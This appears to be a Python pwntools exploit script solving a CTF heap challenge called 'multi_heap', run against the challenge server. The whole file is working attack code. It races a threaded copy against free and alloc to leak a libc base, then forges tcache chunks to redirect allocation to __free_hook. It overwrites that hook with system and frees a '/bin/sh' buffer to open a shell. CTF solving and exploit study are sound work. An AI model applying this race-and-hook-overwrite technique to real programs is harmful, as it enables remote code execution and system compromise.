```python
from pwn import *
import time

#r = process("./multi_heap")
r = remote("multiheap.chal.ctf.westerns.tokyo", 10001)
r.recvuntil(":")

def alloc(type_, size, thread): #type: char, long, float
  r.sendline("1")
  #r.recvuntil(":")
  r.sendline(type_)
  #r.recvuntil(":")
  r.sendline(str(size))
  #r.recvuntil(":")
  r.sendline(thread)
  #r.recvuntil(":")

def free(index):
  r.sendline("2")
  #r.recvuntil(":")
  r.sendline(str(index))
  #r.recvuntil(":")

def write(index):
  r.sendline("3")
  #r.recvuntil(":")
  r.sendline(str(index))

def readchar(index, size, data):
  r.sendline("4")
  r.recvuntil(":")
  r.sendline(str(index))
  r.recvuntil(":")
  r.sendline(str(size))
  r.recvuntil("Content:")
  r.send(data)
  r.recvuntil(":")

def readlong(index, size, data):
  r.sendline("4")
  r.recvuntil(":")
  r.sendline(str(index))
  r.recvuntil(":")
  r.sendline(str(size))
  r.recvuntil("Content:")
  for i in data:
    r.sendline(str(i))
  r.recvuntil(":")

def copy(src, dest, size, thread): #thread: y, n
  r.sendline("5")
  #r.recvuntil(":")
  r.sendline(str(src))
  #r.recvuntil(":")
  r.sendline(str(dest))
  #r.recvuntil(":")
  r.sendline(str(size))
  #r.recvuntil(":")
  r.sendline(thread)
  #r.recvuntil(":")

# leak heap
"""
alloc("char", 0x38, "m")
alloc("char", 0x38, "m")
alloc("char", 0x38, "m")
free(0)
free(0)
free(0)

alloc("char", 0x20, "m") #0
write(0)
leek = r.recvuntil("\x7f")[-6:]
leak = u64(leek.ljust(8, "\x00"))
print hex(leak)
"""

alloc("long", 0x15000, "m") #0
alloc("long", 0x15000, "m") #1

# race memcpy and free/alloc
copy(0, 1, 0x15000-1, "y")

free(0)
alloc("char", 0x11000, "m")

#leek
time.sleep(0.1)
write(1)
leek = r.recvuntil("\x7f")[-6:]
leak = u64(leek.ljust(8, "\x00"))
libcbase = leak - 0x3ec420
freehook = libcbase + 0x3ed8e8
print hex(libcbase)

free(0)
free(0)

#race memcpy overwrite fd setup
alloc("char", 0x15000, "m") #0
alloc("char", 0x15000, "m") #1
fake31 = p64(0x0) + p64(0x31) + p64(0x0)*4
fake71 = p64(0x0) + p64(0x71) + p64(freehook) + p64(0x0)*11
payload = "\x00"*0x14f00 + fake31 + fake71 + fake31
readchar(1, len(payload), payload)

#do copy race
copy(1, 0, len(payload), "y")

free(0)
alloc("char", 0x14f00, "m") #1
alloc("char", 0x60, "m") #2
free(2)

time.sleep(0.5)
alloc("char", 0x60, "m") #2
readchar(2, 8, "/bin/sh\x00")
alloc("char", 0x60, "m") #3

system = libcbase + 0x4f440
readchar(3, 8, p64(system))

free(2)

r.interactive()
```
